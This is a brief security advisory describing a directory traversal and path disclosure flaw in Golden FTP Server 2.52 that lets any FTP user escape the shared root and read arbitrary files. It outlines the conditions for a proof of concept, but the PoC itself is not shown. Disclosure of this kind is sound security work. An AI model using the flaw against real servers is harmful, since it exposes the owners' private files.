Product Description:
 
Golden FTP Server is extremely easy to use personal
FTP server for Windows and can be run by any person
who has the most basic computer skills. 
The program loads automatically on Windows startup and
you can identify the files you want to share with two
mouse clicks via the dialog window 
that works in the same way as the standard Windows
"Open File:" dialog or via the Windows Explorer
context menu. 
Golden FTP Server features clean and easy to
understand multi-lingual interface. Multi-threaded
downloads and ability to resume aborted downloads are
supported.

Problem:

Directory Traversal / Path Disclosure.
 
It is possible for any user to break out of ftproot
via
directory traversal sequence. 
It is possible to access arbitrary files. It is also
possible to disclose shared path by requesting a
non-existent file.

Vulnerability found and tested on version 2.52. Other
versions may be affected.
 
 
In the following PoC c:\Temp is ftproot & mapped to
\Temp, for successful exploitation you must change
down (i.e, cd Temp) into the shared directory before
traversal sequence or disclosure of path.

No vendor response in relation to this issue.
